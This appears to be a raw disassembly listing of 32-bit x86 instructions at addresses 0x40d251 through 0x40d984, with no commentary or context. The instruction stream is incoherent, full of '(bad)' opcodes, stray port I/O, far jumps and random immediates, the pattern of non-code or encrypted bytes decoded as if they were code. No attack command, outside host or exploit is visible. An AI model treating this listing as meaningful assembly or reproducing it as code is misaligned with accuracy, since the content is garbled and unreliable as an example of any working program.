  40d251:	xchg   edx,eax
  40d252:	in     eax,dx
  40d253:	loop   0x40d22b
  40d255:	pop    eax
  40d256:	fld    DWORD PTR [edi+0x332b234d]
  40d25c:	push   edx
  40d25d:	pop    edi
  40d25e:	push   ebx
  40d25f:	fdiv   QWORD PTR [ecx]
  40d261:	sub    al,0x71
  40d263:	and    al,0x1f
  40d265:	ins    DWORD PTR es:[edi],dx
  40d266:	adc    ebx,esi
  40d268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d269:	push   ds
  40d26a:	in     eax,0xcc
  40d26c:	lea    edx,[edi]
  40d26e:	je     0x40d224
  40d270:	xor    BYTE PTR [ebx-0x61],dh
  40d273:	stc    
  40d274:	or     esi,eax
  40d276:	pop    ecx
  40d277:	data16 repz add BYTE PTR [eax-0x33],0x7a
  40d27d:	jg     0x40d20c
  40d27f:	jno    0x40d223
  40d281:	sbb    al,0x7e
  40d283:	jmp    0xef82:0x328d0f45
  40d28a:	(bad)  
  40d28b:	push   edi
  40d28c:	push   ebx
  40d28d:	sbb    al,0x5f
  40d28f:	scas   al,BYTE PTR es:[edi]
  40d290:	sub    DWORD PTR [esi],ebx
  40d292:	or     edi,DWORD PTR [ebx-0xf4be6de]
  40d298:	mov    bh,0x1c
  40d29a:	sbb    al,0x40
  40d29c:	xchg   ecx,eax
  40d29d:	(bad)  
  40d29f:	and    esp,DWORD PTR [esi+0x455ec219]
  40d2a5:	jg     0x40d256
  40d2a7:	xchg   esi,eax
  40d2a8:	retf   0x872c
  40d2ab:	pop    ds
  40d2ac:	adc    DWORD PTR [edx],eax
  40d2ae:	ins    BYTE PTR es:[edi],dx
  40d2af:	out    0x1e,eax
  40d2b1:	pop    ecx
  40d2b2:	pop    es
  40d2b3:	dec    edx
  40d2b4:	test   al,0xac
  40d2b6:	test   al,0x1
  40d2b8:	mov    edx,0x336a952e
  40d2bd:	mov    esp,0x6f1faf0b
  40d2c2:	pop    ebx
  40d2c3:	(bad)  
  40d2c4:	mov    eax,0xa998d8f9
  40d2c9:	in     al,dx
  40d2ca:	pop    esp
  40d2cb:	xchg   ecx,eax
  40d2cc:	sbb    ch,dl
  40d2ce:	jb     0x40d325
  40d2d0:	aad    0x5f
  40d2d2:	sub    BYTE PTR [edx],dl
  40d2d4:	les    ecx,FWORD PTR [eax+0x1b0f3129]
  40d2da:	retf   0x2f1d
  40d2dd:	gs inc di
  40d2e0:	es xchg esi,eax
  40d2e2:	xchg   BYTE PTR [edx-0x3f],bl
  40d2e5:	icebp  
  40d2e6:	cdq    
  40d2e7:	jbe    0x40d321
  40d2e9:	pop    ebx
  40d2ea:	inc    edx
  40d2eb:	mov    edi,0x46cfd9ee
  40d2f0:	jmp    0x43371259
  40d2f5:	xlat   BYTE PTR ds:[ebx]
  40d2f6:	test   BYTE PTR [ebp-0x5d875413],dh
  40d2fc:	pop    eax
  40d2fd:	cwde   
  40d2fe:	dec    esi
  40d2ff:	mov    bh,0x41
  40d301:	sar    BYTE PTR [edi],0xd0
  40d304:	or     DWORD PTR [esi-0x12],0xb1cab51b
  40d30b:	dec    esp
  40d30c:	popf   
  40d30d:	mov    dl,0x3a
  40d30f:	fldenv [ebx+0x546ac796]
  40d315:	mov    WORD PTR [edi+0x3ed553c4],?
  40d31b:	shr    dl,cl
  40d31d:	(bad)  
  40d31f:	pop    esp
  40d320:	mov    cl,0x38
  40d322:	sbb    esi,ecx
  40d324:	ja     0x40d377
  40d326:	ja     0x40d38d
  40d328:	push   ss
  40d329:	jnp    0x40d2d3
  40d32b:	dec    esi
  40d32c:	(bad)
  40d330:	stc    
  40d331:	enter  0x4201,0x54
  40d335:	shl    BYTE PTR [edx-0x79],1
  40d338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d339:	push   0x9
  40d33b:	loop   0x40d320
  40d33d:	outs   dx,DWORD PTR ds:[esi]
  40d33e:	xchg   ecx,eax
  40d33f:	jae    0x40d33d
  40d341:	popf   
  40d342:	xor    ebx,DWORD PTR [edx]
  40d344:	fidiv  WORD PTR [edx-0x55]
  40d347:	shl    DWORD PTR ds:0x1f08099a,1
  40d34d:	adc    ah,dl
  40d34f:	xchg   ecx,eax
  40d350:	cwde   
  40d351:	cmp    eax,0x1f3d7eb4
  40d356:	sar    bh,0x3b
  40d359:	xor    ah,BYTE PTR ds:0x4287e063
  40d35f:	xor    eax,0x6caf3c7a
  40d364:	push   es
  40d365:	pop    esp
  40d366:	lods   eax,DWORD PTR ds:[esi]
  40d367:	dec    esi
  40d368:	sahf   
  40d369:	stos   DWORD PTR es:[edi],eax
  40d36a:	pop    ebp
  40d36b:	lds    ebx,FWORD PTR [eax]
  40d36d:	xor    cl,dh
  40d36f:	dec    eax
  40d370:	add    edx,DWORD PTR [ebx+0x25]
  40d373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d374:	pop    ebp
  40d375:	and    BYTE PTR [ebp+0x28],bl
  40d378:	push   ebx
  40d379:	push   ebx
  40d37a:	or     esi,DWORD PTR fs:[eax+0x7c]
  40d37e:	sbb    dl,ah
  40d380:	imul   DWORD PTR [eax]
  40d382:	jb     0x40d3ca
  40d384:	push   ebx
  40d385:	(bad)  
  40d386:	(bad)  
  40d387:	and    al,0x1f
  40d389:	mov    BYTE PTR [esi-0x2f5bc8e3],dh
  40d38f:	aad    0x5f
  40d391:	pop    edx
  40d392:	sbb    eax,0x96b21f5c
  40d397:	aas    
  40d398:	(bad)  
  40d399:	sub    eax,0x326c5b68
  40d39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d39f:	stos   BYTE PTR es:[edi],al
  40d3a0:	or     ebx,DWORD PTR [ebx]
  40d3a2:	mov    edx,DWORD PTR [ecx+ebx*8-0x7d0477d]
  40d3a9:	dec    ebx
  40d3aa:	test   BYTE PTR [ebx+0x2c],0x12
  40d3ae:	dec    esp
  40d3af:	push   0xca4ef5ef
  40d3b4:	pop    edi
  40d3b5:	imul   BYTE PTR [esp+ebp*1-0x3c]
  40d3b9:	mov    esi,0xf11f5e82
  40d3be:	iret   
  40d3bf:	sahf   
  40d3c0:	ins    DWORD PTR es:[edi],dx
  40d3c1:	aam    0xff
  40d3c3:	and    al,0x4a
  40d3c5:	pop    esp
  40d3c6:	jne    0x40d399
  40d3c8:	pop    ebx
  40d3c9:	and    dh,BYTE PTR ds:0xc3a79ab9
  40d3cf:	or     bh,BYTE PTR [ebp-0x32]
  40d3d2:	(bad)  
  40d3d3:	mov    ah,0x97
  40d3d5:	mov    edi,0xcde08e79
  40d3da:	test   esp,ebx
  40d3dc:	mov    eax,ds:0xacacd4fd
  40d3e1:	loop   0x40d3ef
  40d3e3:	cld    
  40d3e4:	clc    
  40d3e5:	sub    DWORD PTR [eax-0x5f904174],0x35
  40d3ec:	xlat   BYTE PTR ds:[ebx]
  40d3ed:	in     eax,dx
  40d3ee:	clc    
  40d3ef:	pop    ds
  40d3f0:	fstp   QWORD PTR [ecx]
  40d3f2:	pop    ecx
  40d3f3:	add    ecx,DWORD PTR [ebp-0x80]
  40d3f6:	test   ebp,ebp
  40d3f8:	xchg   edx,eax
  40d3f9:	sub    al,0x9e
  40d3fb:	push   edx
  40d3fc:	cmp    DWORD PTR ds:0xc19dc5ec,esp
  40d402:	inc    ebp
  40d403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d404:	inc    DWORD PTR [ebp+0x36]
  40d407:	or     eax,0xfe184732
  40d40c:	js     0x40d3c5
  40d40e:	jno    0x40d42d
  40d410:	sahf   
  40d411:	xchg   BYTE PTR [ebx+0x2f8aa510],bl
  40d417:	pop    es
  40d418:	into   
  40d419:	dec    edx
  40d41a:	loopne 0x40d423
  40d41c:	test   al,0x4c
  40d41e:	adc    al,0x38
  40d420:	jecxz  0x40d448
  40d422:	inc    esi
  40d423:	or     ch,BYTE PTR [eax+0x36540853]
  40d429:	inc    edi
  40d42a:	xor    ecx,DWORD PTR [esi-0x6f]
  40d42d:	sbb    edx,DWORD PTR [eax]
  40d42f:	(bad)  
  40d430:	in     al,0xe
  40d432:	jg     0x40d423
  40d434:	lods   eax,DWORD PTR ds:[esi]
  40d435:	add    al,0x1f
  40d437:	mov    eax,0x2ae603b8
  40d43c:	adc    al,0x9a
  40d43e:	scas   eax,DWORD PTR es:[edi]
  40d43f:	cli    
  40d440:	or     al,0x71
  40d442:	jl     0x40d3fa
  40d444:	cdq    
  40d445:	fs (bad) 
  40d447:	fist   DWORD PTR [ebx+esi*8-0x5b]
  40d44b:	lods   eax,DWORD PTR ds:[si]
  40d44d:	adc    BYTE PTR [edx-0x1c],bl
  40d450:	mov    al,0xca
  40d452:	jo     0x40d490
  40d454:	inc    edi
  40d455:	loope  0x40d45e
  40d457:	lahf   
  40d458:	inc    DWORD PTR [ecx]
  40d45a:	fistp  DWORD PTR [ebx-0x55]
  40d45d:	push   ecx
  40d45e:	cli    
  40d45f:	jnp    0x40d472
  40d461:	into   
  40d462:	(bad)  [ebx+0x72]
  40d465:	fpatan 
  40d467:	xchg   BYTE PTR [edx-0x3aa2360d],ah
  40d46d:	sub    eax,0x77c183f1
  40d472:	retf   
  40d473:	cmp    edi,eax
  40d475:	inc    edi
  40d476:	mov    WORD PTR [ebp+edi*8+0x76],gs
  40d47a:	xor    bh,ah
  40d47c:	push   esi
  40d47d:	js     0x40d430
  40d47f:	sub    eax,0x40be4f6e
  40d484:	xchg   ecx,eax
  40d485:	leave  
  40d486:	dec    ebp
  40d487:	leave  
  40d488:	sbb    BYTE PTR [ebx],bl
  40d48a:	in     eax,dx
  40d48b:	push   esp
  40d48c:	adc    BYTE PTR [edx-0x53],cl
  40d48f:	pop    ds
  40d490:	cwde   
  40d491:	sub    DWORD PTR [edi],esp
  40d493:	sub    al,0xf5
  40d495:	and    dl,BYTE PTR [edi+ebp*1]
  40d498:	adc    BYTE PTR [eax+0xe502f80],dl
  40d49e:	call   0x47a16b58
  40d4a3:	stos   DWORD PTR es:[edi],eax
  40d4a4:	sub    ebx,ebp
  40d4a6:	(bad)  
  40d4a7:	mov    ch,0xfd
  40d4a9:	sar    BYTE PTR [eax-0x12081107],0x7d
  40d4b0:	enter  0x638f,0x27
  40d4b4:	imul   esp,ecx,0xaca7238c
  40d4ba:	xchg   ebp,eax
  40d4bb:	xchg   DWORD PTR [ebp+0x7ec8a817],eax
  40d4c1:	int    0xa3
  40d4c3:	push   edx
  40d4c4:	retf   0x1260
  40d4c7:	fld    DWORD PTR [edi-0x29]
  40d4ca:	xchg   ebx,eax
  40d4cb:	ret    
  40d4cc:	cmp    BYTE PTR [esi+0x17825131],0x50
  40d4d3:	shl    BYTE PTR [edx],0x61
  40d4d6:	cmp    ebp,DWORD PTR [ebx+0x4b]
  40d4d9:	aad    0x8d
  40d4db:	ds pop edx
  40d4dd:	fldl2t 
  40d4df:	pop    es
  40d4e0:	std    
  40d4e1:	mov    al,al
  40d4e3:	cmp    cl,BYTE PTR ds:0xdc7dfa10
  40d4e9:	mov    ecx,0x5f9083a9
  40d4ee:	bound  ebx,QWORD PTR [ecx+0x64dfffc1]
  40d4f4:	and    ebp,DWORD PTR [eax+0x4a]
  40d4f7:	sbb    DWORD PTR [esi+0x65],0x27
  40d4fb:	pop    ebp
  40d4fc:	fs pop ebx
  40d4fe:	test   eax,0x5852d9a0
  40d503:	imul   esp,DWORD PTR [ebp+0x3c],0xd6a5f334
  40d50a:	dec    edx
  40d50b:	scas   al,BYTE PTR es:[edi]
  40d50c:	add    al,0x26
  40d50e:	out    0x92,eax
  40d510:	or     al,0x8e
  40d512:	jnp    0x40d4c1
  40d514:	and    eax,0xc69832b
  40d519:	fmul   QWORD PTR [esi+0x50]
  40d51c:	cli    
  40d51d:	mov    edi,0xdbe6c02f
  40d522:	dec    eax
  40d523:	jp     0x40d577
  40d525:	jns    0x40d574
  40d527:	mov    eax,ds:0x85fee504
  40d52c:	test   BYTE PTR [esp+ebx*2+0x450498d2],cl
  40d533:	jl     0x40d592
  40d535:	jbe    0x40d50c
  40d537:	jbe    0x40d51d
  40d539:	push   es
  40d53a:	push   esp
  40d53b:	repz ja 0x40d5bc
  40d53e:	imul   ebp,DWORD PTR [esi],0x78
  40d541:	mov    edi,0x8ddbb2a3
  40d546:	push   ebx
  40d547:	cmp    eax,0xe8be16ae
  40d54c:	and    eax,0x57dc9070
  40d551:	inc    ebp
  40d552:	or     DWORD PTR [ebx+ebp*4+0x3b59e8e1],eax
  40d559:	add    ebp,DWORD PTR [edi]
  40d55b:	xchg   esp,eax
  40d55c:	stos   BYTE PTR es:[edi],al
  40d55d:	and    eax,0xd3efd30e
  40d562:	push   ebp
  40d563:	loope  0x40d4e8
  40d565:	xor    edx,DWORD PTR [eax-0x38]
  40d568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d56a:	test   BYTE PTR [ebx],cl
  40d56c:	add    dl,BYTE PTR ds:0x9b752dc1
  40d572:	scas   eax,DWORD PTR es:[edi]
  40d573:	fadd   DWORD PTR [esp+eax*8+0x7eeb183e]
  40d57a:	ret    
  40d57b:	mov    bh,BYTE PTR [ecx+0x73]
  40d57e:	fisub  WORD PTR [ecx]
  40d580:	xchg   BYTE PTR [ecx+esi*4+0x47d6a9ca],bl
  40d587:	mov    eax,ds:0x3fac2ad2
  40d58c:	inc    ebp
  40d58d:	test   eax,0x6905bdcb
  40d592:	xchg   BYTE PTR ds:0xc1f247d4,al
  40d598:	dec    edx
  40d599:	push   edx
  40d59a:	xchg   BYTE PTR [ecx],dl
  40d59c:	retf   0x7e8b
  40d59f:	jb     0x40d563
  40d5a1:	(bad)  
  40d5a2:	popa   
  40d5a3:	jne    0x40d572
  40d5a5:	jne    0x40d559
  40d5a7:	push   esp
  40d5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5a9:	stos   BYTE PTR es:[edi],al
  40d5aa:	sbb    eax,DWORD PTR ds:[edx-0x26797201]
  40d5b1:	retf   0x266b
  40d5b4:	cs dec edx
  40d5b6:	cmp    BYTE PTR [edx+0x78],bh
  40d5b9:	or     edx,0x8
  40d5bc:	push   ds
  40d5bd:	add    DWORD PTR [edx+0x76],eax
  40d5c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c1:	jo     0x40d5fa
  40d5c3:	cmp    eax,0x8c475caa
  40d5c8:	test   DWORD PTR [edi],edi
  40d5ca:	mov    BYTE PTR [edi+0x4a],dl
  40d5cd:	outs   dx,DWORD PTR ds:[esi]
  40d5ce:	pusha  
  40d5cf:	sbb    dl,dl
  40d5d1:	je     0x40d617
  40d5d3:	lods   al,BYTE PTR ds:[esi]
  40d5d4:	sahf   
  40d5d5:	mov    al,0x4d
  40d5d7:	adc    DWORD PTR ds:0x5aaaef70,esi
  40d5dd:	pop    edi
  40d5de:	mov    esp,0xf0d79d23
  40d5e3:	pop    es
  40d5e4:	xchg   edi,eax
  40d5e5:	mov    al,0xb1
  40d5e7:	jb     0x40d64c
  40d5e9:	fimul  DWORD PTR [edx]
  40d5eb:	popa   
  40d5ec:	jnp    0x40d657
  40d5ee:	push   esi
  40d5ef:	stos   DWORD PTR es:[edi],eax
  40d5f0:	and    BYTE PTR [edx],ch
  40d5f2:	sbb    bh,BYTE PTR [edi]
  40d5f4:	pop    esi
  40d5f5:	mov    esi,0xa61263e3
  40d5fa:	adc    al,0xcc
  40d5fd:	xor    edx,esp
  40d5ff:	mov    al,ds:0x8c6e904a
  40d604:	xchg   DWORD PTR [edx+edi*4-0x4],edx
  40d608:	inc    ebp
  40d609:	push   ebp
  40d60a:	in     al,dx
  40d60b:	lods   eax,DWORD PTR ds:[esi]
  40d60c:	push   eax
  40d60d:	adc    al,0x4f
  40d60f:	mov    al,ds:0xa2dfcb4d
  40d614:	mov    dl,BYTE PTR [esi-0x27]
  40d617:	xchg   BYTE PTR [esi+0x7a268cf8],al
  40d61d:	or     BYTE PTR [ecx],0x58
  40d620:	xor    DWORD PTR ds:0x3d1be4be,eax
  40d626:	push   0x9a766400
  40d62b:	fimul  DWORD PTR [ebx-0x29b26eab]
  40d631:	mov    cl,0x3e
  40d633:	cmp    al,0xee
  40d635:	arpl   WORD PTR [ebx+0x57],bp
  40d638:	mov    al,ds:0xe3711220
  40d63d:	outs   dx,DWORD PTR ds:[esi]
  40d63e:	data16 xabort 0xf6
  40d642:	mov    cl,0x3c
  40d644:	mov    ds:0xb4db83c5,eax
  40d649:	retf   
  40d64a:	aad    0x51
  40d64c:	or     BYTE PTR [edx+eiz*1],bh
  40d64f:	out    dx,al
  40d650:	sub    DWORD PTR [edi*4-0x6f31fcc1],eax
  40d657:	fs nop
  40d659:	rcl    BYTE PTR [ebx+0x2f],cl
  40d65c:	mov    ds,WORD PTR [esp+edx*4+0x15]
  40d660:	sub    ecx,DWORD PTR [eax+0x4f]
  40d663:	mov    ebp,0x87a2afa9
  40d668:	sub    al,0xe0
  40d66a:	imul   ebx,DWORD PTR [ebx-0x2996c4a3],0xffffffda
  40d671:	ror    eax,1
  40d673:	dec    ebx
  40d674:	pop    ebx
  40d675:	push   cs
  40d676:	mov    eax,0xac222e1f
  40d67b:	dec    edx
  40d67c:	std    
  40d67d:	scas   al,BYTE PTR es:[edi]
  40d67e:	imul   edx,DWORD PTR [edx],0xffffffc4
  40d681:	leave  
  40d682:	adc    al,0x99
  40d684:	adc    BYTE PTR [esp+edi*1+0x1bdcdec2],ch
  40d68b:	cmp    DWORD PTR [edi-0x951f3c1],ecx
  40d691:	mov    edx,0x107a2d6b
  40d696:	fwait
  40d697:	mov    DWORD PTR [esi+0x2f0b4d76],0x799199a6
  40d6a1:	fs xor esp,ebp
  40d6a4:	jo     0x40d720
  40d6a6:	add    ecx,ebx
  40d6a8:	xor    al,0x7
  40d6aa:	ins    BYTE PTR es:[edi],dx
  40d6ab:	sbb    ch,BYTE PTR [eax]
  40d6ad:	push   0xffffffe7
  40d6af:	mov    dh,BYTE PTR [esi]
  40d6b1:	stc    
  40d6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b4:	out    dx,al
  40d6b5:	push   0x2a93ea03
  40d6ba:	jno    0x40d689
  40d6bc:	pop    ebx
  40d6bd:	add    ah,BYTE PTR [ecx-0x8]
  40d6c0:	std    
  40d6c1:	mov    ds,WORD PTR [edx-0x6f0a83d1]
  40d6c7:	xchg   esp,eax
  40d6c8:	fist   DWORD PTR [esi]
  40d6ca:	sbb    edi,DWORD PTR [ebx-0x207b5c53]
  40d6d0:	retf   0xe254
  40d6d3:	outs   dx,DWORD PTR ds:[esi]
  40d6d4:	mov    cl,0x23
  40d6d6:	xchg   esp,eax
  40d6d7:	inc    eax
  40d6d8:	jmp    0x40d6bb
  40d6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6db:	mov    eax,0x12a32b3a
  40d6e0:	pop    ecx
  40d6e1:	mov    edi,DWORD PTR [esi]
  40d6e3:	xchg   ebp,eax
  40d6e4:	or     BYTE PTR [esi+0xee2b981],dl
  40d6ea:	fisttp WORD PTR [edx+0x7bf6bf59]
  40d6f0:	mov    ch,BYTE PTR [edi]
  40d6f2:	outs   dx,BYTE PTR ds:[esi]
  40d6f3:	jbe    0x40d74f
  40d6f5:	sbb    al,0xb7
  40d6f7:	pop    edi
  40d6f8:	imul   ebp,DWORD PTR [ecx],0x21
  40d6fb:	into   
  40d6fc:	(bad)
  40d700:	adc    eax,0xc38fb582
  40d705:	cs (bad) 
  40d708:	inc    eax
  40d709:	inc    eax
  40d70a:	push   esi
  40d70b:	push   ss
  40d70c:	and    al,0xc6
  40d70e:	shr    bh,0x38
  40d711:	mov    eax,0x29d36fd0
  40d716:	je     0x40d758
  40d718:	add    BYTE PTR ds:0x95c87584,bl
  40d71e:	xor    ebx,DWORD PTR [edx-0x616f3e8b]
  40d724:	daa    
  40d725:	ja     0x40d73b
  40d727:	adc    al,0x7f
  40d729:	scas   eax,DWORD PTR es:[edi]
  40d72a:	sub    esp,DWORD PTR [esi-0x57c032a3]
  40d730:	out    0xde,ax
  40d733:	inc    DWORD PTR [ecx-0x1786bba0]
  40d739:	clc    
  40d73a:	or     al,0x22
  40d73c:	rcr    BYTE PTR [edi-0xb],1
  40d73f:	cmp    al,0xff
  40d741:	fs es mov edx,0x1ef592d9
  40d748:	in     al,0x87
  40d74a:	enter  0x7da7,0x3
  40d74e:	or     eax,0x297e19bd
  40d753:	fimul  DWORD PTR [ebx+esi*8+0x261bc46a]
  40d75a:	mov    bl,0x57
  40d75c:	dec    eax
  40d75d:	call   0x427a36cf
  40d762:	pusha  
  40d763:	scas   eax,DWORD PTR es:[edi]
  40d764:	adc    cl,bh
  40d766:	dec    ecx
  40d767:	ds inc esi
  40d769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d76a:	xor    al,0x64
  40d76c:	pop    ebp
  40d76d:	shl    DWORD PTR [edx-0x3740a469],1
  40d773:	pop    ebx
  40d774:	(bad)  
  40d775:	xchg   esp,eax
  40d776:	(bad)  
  40d777:	push   ebp
  40d778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d779:	xchg   esi,eax
  40d77a:	mov    ebx,0x54fa42fa
  40d77f:	adc    ebx,esp
  40d781:	xor    bh,0x18
  40d784:	push   ebp
  40d785:	int3   
  40d786:	scas   al,BYTE PTR es:[edi]
  40d787:	out    0x58,al
  40d789:	sbb    BYTE PTR ds:0x7f3c8aef,dh
  40d78f:	cdq    
  40d790:	das    
  40d791:	cmp    DWORD PTR [edx+0x12],ecx
  40d794:	les    esi,FWORD PTR [ebp+0x6b]
  40d797:	lods   eax,DWORD PTR ds:[esi]
  40d798:	mov    dl,0xa9
  40d79a:	pop    edx
  40d79b:	cmp    BYTE PTR [esi-0x26351b17],0x39
  40d7a2:	cmp    dh,ch
  40d7a4:	sub    bh,BYTE PTR [edi]
  40d7a6:	xor    ch,BYTE PTR [edi]
  40d7a8:	sub    DWORD PTR [edi+0x7e00dd7b],ebx
  40d7ae:	jmp    0x40d808
  40d7b0:	in     al,0xa7
  40d7b2:	dec    ebx
  40d7b3:	outs   dx,DWORD PTR ds:[esi]
  40d7b4:	or     DWORD PTR [eax+0x4],0x712313c9
  40d7bb:	push   edx
  40d7bc:	inc    eax
  40d7bd:	lods   al,BYTE PTR ds:[esi]
  40d7be:	mov    eax,esi
  40d7c0:	loope  0x40d7ff
  40d7c2:	cdq    
  40d7c3:	cmp    eax,0x7163404e
  40d7c8:	and    BYTE PTR [ebp+ebp*4+0x39e13a3f],dl
  40d7cf:	xchg   cl,cl
  40d7d1:	cmovg  ecx,ebx
  40d7d4:	int3   
  40d7d5:	bnd jns 0x40d7e2
  40d7d8:	gs (bad) 
  40d7da:	mov    ds:0x5d611a97,al
  40d7df:	sbb    eax,0x6fd334df
  40d7e4:	dec    esp
  40d7e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e6:	pop    eax
  40d7e7:	(bad)  
  40d7e8:	xor    esi,DWORD PTR [esi-0x4757c414]
  40d7ee:	push   ebp
  40d7ef:	shl    edi,1
  40d7f1:	(bad)  
  40d7f2:	jge    0x40d7a7
  40d7f4:	and    eax,0x1f8bf53c
  40d7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7fa:	cmp    DWORD PTR [ebx+0x68e3e67a],esi
  40d800:	gs adc al,0xe7
  40d803:	gs add eax,0xcac0f0c6
  40d809:	ds and esp,0xffffff84
  40d80d:	jns    0x40d823
  40d80f:	add    eax,0x1a3721c5
  40d814:	and    edx,ebx
  40d816:	sub    DWORD PTR [ecx-0x66],0x71
  40d81a:	out    0x20,eax
  40d81c:	in     eax,dx
  40d81d:	push   edx
  40d81e:	add    ch,BYTE PTR [eax-0x16882dea]
  40d824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d825:	repz ss addr16 pop es
  40d829:	jp     0x40d87f
  40d82b:	mov    fs,edi
  40d82d:	mul    BYTE PTR [ebx-0x4605f64a]
  40d833:	jp     0x40d816
  40d835:	sahf   
  40d836:	mov    BYTE PTR [ecx],dl
  40d838:	dec    eax
  40d839:	leave  
  40d83a:	xchg   BYTE PTR [edx+0x56],bl
  40d83d:	retf   
  40d83e:	or     eax,0x193c8019
  40d843:	inc    edi
  40d844:	sahf   
  40d845:	cmp    edi,DWORD PTR [eax+0x35476b47]
  40d84b:	pop    eax
  40d84c:	and    eax,0x5ae9856d
  40d851:	test   al,0x89
  40d853:	in     eax,0x77
  40d855:	adc    esp,edi
  40d857:	cs push edx
  40d859:	push   ds
  40d85a:	inc    esi
  40d85b:	ss je  0x40d80e
  40d85e:	inc    eax
  40d85f:	xchg   esi,eax
  40d860:	mov    bl,0x87
  40d862:	dec    edx
  40d863:	xchg   sp,ax
  40d865:	adc    ebx,DWORD PTR [ecx+ecx*8-0xb60a945]
  40d86c:	push   0xffffffd5
  40d86e:	pop    ebx
  40d86f:	inc    dh
  40d871:	rol    DWORD PTR [ebx],1
  40d873:	fist   DWORD PTR [ebx-0x8]
  40d876:	sar    ch,1
  40d878:	das    
  40d879:	mov    ebx,0x7f08a3eb
  40d87e:	fwait
  40d87f:	ins    DWORD PTR es:[edi],dx
  40d880:	out    0x4a,eax
  40d882:	jae    0x40d8de
  40d884:	push   eax
  40d885:	xor    BYTE PTR [ecx+0x6ab309ee],dl
  40d88b:	and    esi,DWORD PTR [ebx+0x14]
  40d88e:	in     al,dx
  40d88f:	xor    eax,0x55857341
  40d894:	scas   al,BYTE PTR es:[edi]
  40d895:	jnp    0x40d887
  40d897:	inc    ebx
  40d898:	push   ecx
  40d899:	fs dec ecx
  40d89b:	add    ecx,DWORD PTR [edi+0x4e29d366]
  40d8a1:	out    0x7c,al
  40d8a3:	je     0x40d83e
  40d8a5:	data16 mov BYTE PTR [ecx],ah
  40d8a8:	sub    BYTE PTR [esi],0x1a
  40d8ab:	cmp    BYTE PTR [ebp+0x63],bl
  40d8ae:	push   ebp
  40d8af:	adc    eax,0xbc05d4
  40d8b4:	loope  0x40d84d
  40d8b6:	rcl    BYTE PTR [esi+0x78],0xec
  40d8ba:	ror    BYTE PTR [edx],0x4d
  40d8bd:	sub    BYTE PTR [esi],dl
  40d8bf:	mov    BYTE PTR [eax+eax*4+0x21efea1],bl
  40d8c6:	rcr    DWORD PTR [edi+0x26],1
  40d8c9:	add    BYTE PTR [ebx],ah
  40d8cb:	scas   eax,DWORD PTR es:[edi]
  40d8cc:	mov    dh,0xa2
  40d8ce:	xor    DWORD PTR [esi-0x5c3318b1],esi
  40d8d4:	push   eax
  40d8d5:	jno    0x40d884
  40d8d7:	daa    
  40d8d8:	outs   dx,DWORD PTR ds:[esi]
  40d8d9:	push   es
  40d8da:	inc    edx
  40d8db:	inc    ebx
  40d8dc:	mov    ds:0x8d5f1f36,eax
  40d8e1:	xchg   edi,eax
  40d8e2:	jp     0x40d885
  40d8e4:	adc    edx,esp
  40d8e6:	ja     0x40d8e4
  40d8e8:	imul   BYTE PTR [esi-0x66]
  40d8eb:	mov    bl,ah
  40d8ed:	test   DWORD PTR [eax],ebp
  40d8ef:	je     0x40d913
  40d8f1:	mov    edx,0xa9bab048
  40d8f6:	cmp    BYTE PTR [edx+edx*4],0xd1
  40d8fa:	(bad)  
  40d8fb:	fisub  DWORD PTR [ecx]
  40d8fd:	(bad)  
  40d8fe:	neg    BYTE PTR [edi]
  40d900:	jmp    esp
  40d902:	stc    
  40d903:	ins    DWORD PTR es:[edi],dx
  40d904:	enter  0x1e23,0xc3
  40d908:	dec    eax
  40d909:	jno    0x40d8bc
  40d90b:	mov    ebp,0x22d63b05
  40d910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d911:	outs   dx,BYTE PTR ds:[esi]
  40d912:	cmova  esp,DWORD PTR [ebp-0x40b4b79d]
  40d919:	call   0x13bce77f
  40d91e:	mov    dl,0xe5
  40d920:	iret   
  40d921:	push   ebp
  40d922:	inc    esp
  40d923:	mov    al,0xa3
  40d925:	push   ebx
  40d926:	das    
  40d927:	gs cli 
  40d929:	and    BYTE PTR [ecx-0x1c],cl
  40d92c:	mov    ah,0xac
  40d92e:	aad    0x20
  40d930:	inc    edx
  40d931:	mov    dh,0xb0
  40d933:	mov    WORD PTR [ecx-0x29e4951d],gs
  40d939:	xchg   esi,eax
  40d93a:	inc    edx
  40d93b:	sbb    al,0x46
  40d93d:	xchg   edx,eax
  40d93e:	mov    esi,0xa18f1abf
  40d943:	inc    ebx
  40d944:	mov    bh,0x6b
  40d946:	mov    edi,0x29248a27
  40d94b:	dec    edi
  40d94c:	rcr    DWORD PTR [ebp-0x63],cl
  40d94f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d950:	int3   
  40d951:	mov    esp,0xb98a7a7b
  40d956:	add    ah,dl
  40d958:	mov    ecx,0xbab999e
  40d95d:	in     ax,0xbc
  40d960:	loop   0x40d910
  40d962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d963:	scas   al,BYTE PTR es:[edi]
  40d964:	imul   eax,edi,0xffffffc3
  40d967:	enter  0xc266,0x15
  40d96b:	int    0x30
  40d96d:	fdiv   QWORD PTR [eax]
  40d96f:	imul   esp,eax,0xffffff97
  40d972:	gs ins BYTE PTR es:[edi],dx
  40d974:	mov    bh,0xe6
  40d976:	xlat   BYTE PTR ds:[ebx]
  40d977:	adc    BYTE PTR [edi],al
  40d979:	sbb    ah,dh
  40d97b:	addr16 pop ebx
  40d97d:	hlt    
  40d97e:	rcl    DWORD PTR ds:0xa966d449,1
  40d984:	dec    esp
